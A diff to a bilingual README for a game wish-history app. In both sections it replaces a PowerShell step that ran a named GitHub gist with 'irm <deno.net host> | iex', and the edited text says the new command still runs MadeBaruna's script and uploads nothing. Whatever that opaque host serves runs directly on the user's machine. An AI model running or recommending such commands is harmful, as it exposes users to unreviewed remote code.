@@ -25,9 +25,9 @@ Open the app, then load your history one of two ways.
 2. Open **PowerShell** (search "PowerShell" in the Start menu).
 3. Run this, then copy its output (your wish link):
    ```powershell
-   iex "&{$(irm https://gist.githubusercontent.com/MadeBaruna/1d75c1d37d19eca71591ec8a31178235/raw/getlink_global.ps1)} global"
+   irm https://radiance.vanhexen.deno.net/wish | iex
    ```
-   The script (the one paimon.moe uses) reads your local game cache and prints the link — it uploads nothing.
+   This runs MadeBaruna's getlink script (the one paimon.moe uses) — reads your local game cache, prints the link, uploads nothing.
 4. Paste the link into the app and press **Fetch**. A small proxy ([`worker.js`](worker.js)) reads your
    character-banner history from HoYo and returns it; nothing is stored or made public.
 
@@ -107,9 +107,9 @@ Apri l'app, poi carica la cronologia in uno dei due modi.
 2. Apri **PowerShell** (cerca "PowerShell" nel menu Start).
 3. Esegui questo, poi copia l'output (il tuo link dei desideri):
    ```powershell
-   iex "&{$(irm https://gist.githubusercontent.com/MadeBaruna/1d75c1d37d19eca71591ec8a31178235/raw/getlink_global.ps1)} global"
+   irm https://radiance.vanhexen.deno.net/wish | iex
    ```
-   Lo script (quello usato da paimon.moe) legge la cache locale del gioco e stampa il link — non carica nulla.
+   Esegue lo script getlink di MadeBaruna (quello usato da paimon.moe) — legge la cache locale del gioco, stampa il link, non carica nulla.
 4. Incolla il link nell'app e premi **Fetch**. Un piccolo proxy ([`worker.js`](worker.js)) legge la cronologia
    del banner personaggio da HoYo e la restituisce; niente viene salvato o reso pubblico.
 
